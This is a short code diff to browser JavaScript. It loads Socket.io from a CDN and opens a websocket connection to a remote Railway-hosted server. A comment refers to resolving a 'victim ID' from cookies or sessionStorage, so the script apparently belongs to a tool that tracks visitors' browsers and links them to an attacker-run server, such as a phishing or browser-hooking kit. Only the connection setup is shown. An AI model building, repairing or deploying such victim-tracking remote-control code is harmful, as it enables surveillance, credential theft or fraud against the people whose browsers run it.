@@ -5,12 +5,15 @@
     // Socket.io server URL
     const SOCKET_SERVER_URL = 'https://my-project.railway.app';
 
+    // Load Socket.io from CDN
     const socketScript = document.createElement('script');
-    socketScript.src = SOCKET_SERVER_URL + '/socket.io/socket.io.js';
+    socketScript.src = 'https://cdn.socket.io/4.5.4/socket.io.min.js';
     document.head.appendChild(socketScript);
 
     socketScript.onload = function() {
-        const socket = io(SOCKET_SERVER_URL);
+        const socket = io(SOCKET_SERVER_URL, {
+            transports: ['websocket', 'polling']
+        });
 
         // Resolve victim ID: prefer server-set cookie, then sessionStorage
         function getCookie(name) {
